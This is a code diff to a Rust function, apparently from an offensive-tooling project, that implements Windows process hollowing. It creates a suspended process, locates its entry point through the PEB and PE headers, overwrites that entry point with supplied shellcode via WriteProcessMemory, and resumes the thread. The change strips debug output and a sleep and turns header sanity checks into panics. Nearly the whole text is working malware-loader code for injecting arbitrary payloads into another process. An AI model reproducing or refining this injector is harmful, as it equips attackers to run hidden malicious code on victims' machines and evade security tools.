@@ -5,7 +5,6 @@ use windows::Win32::Foundation::PSTR;
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
-use std::{thread, time};
 
 const POINTER_SIZE: usize = mem::size_of::<&u8>();
 const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
@@ -13,7 +12,6 @@ const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
 pub fn hollow_and_run(shellcode: &[u8]) {
-    let sleep_timer = time::Duration::from_millis(20000);
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
@@ -49,9 +47,6 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         panic!("Could not create the suspended process with CreateProcessA");
     }
 
-    let pid = process_information.dwProcessId;
-    println!("Process created, and its PID is {pid:?}");
-
     // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
     // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
@@ -81,12 +76,9 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     let read_result = unsafe { ReadProcessMemory(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
         panic!("Could not read the DOS header with ReadProcessMemory");
+    } else if header_buffer[0] != 77 || header_buffer[1] != 90 {
+        panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
     }
-
-    if header_buffer[0] == 77 && header_buffer[1] == 90 {
-        println!("Everything up to here looks correct; the DOS header buffer starts with MZ (77, 90)")
-    }
-    println!("The full DOS header buffer is {header_buffer:?}");
 
     // Write the shellcode to the suspended process with WriteProcessMemory
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
@@ -95,23 +87,16 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
     let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
     let entry_point_address = entry_point_rva as u64 + pe_base_address;
-
-    if header_buffer[e_lfanew as usize + 0x18] == 11 && header_buffer[e_lfanew as usize + 0x19] == 2 {
-        println!("Everything up to here looks correct; the optional header starts with 11, 2")
+    if header_buffer[e_lfanew as usize + 0x18] != 11 || header_buffer[e_lfanew as usize + 0x19] != 2 {
+        panic!("An offset looks incorrect, the optional header magic bytes don't correspond to '0x020B'");
     }
-    println!("pe_base_address = {pe_base_address}");
-    println!("e_lfanew = {e_lfanew}");
-    println!("entry_point_rva {entry_point_rva}");
-    println!("entry_point_address {entry_point_address}");
+
+    // The issue must be from here down. All the offsets look the same in my C# version as they do here
 
     let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as _, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
         panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
     }
-
-    let resc = write_result.as_bool();
-    println!("We wrote the bytes because the write result was {resc}");
-    thread::sleep(sleep_timer);
 
     // Start it back up with ResumeThread
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
@@ -120,6 +105,4 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     if resume_result != 1 {
         panic!("Could not resume the suspended process' execution");
     }
-
-    println!("Resume result was {resume_result}");
 }
